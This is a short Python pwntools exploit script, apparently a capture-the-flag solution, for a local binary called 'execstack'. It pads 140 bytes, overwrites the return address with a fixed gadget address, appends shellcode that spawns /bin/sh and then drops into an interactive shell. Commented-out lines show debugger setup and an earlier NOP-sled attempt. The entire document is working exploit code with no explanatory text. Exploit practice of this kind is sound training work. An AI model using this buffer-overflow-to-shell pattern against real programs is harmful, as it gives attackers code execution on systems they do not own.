from pwn import *

p = process('./execstack')
# gdb.attach(p, '''
# 	b *chall+40
# 	continue
# 	''')
p.recvuntil('You can try to make your own though:')

offset = '0'*140

payload = offset
# payload += p32(0xffffd1e0)
# payload += '\x90'*10
payload += p32(0x80484b3)
payload += asm(shellcraft.sh())

p.sendline(payload)
p.interactive() 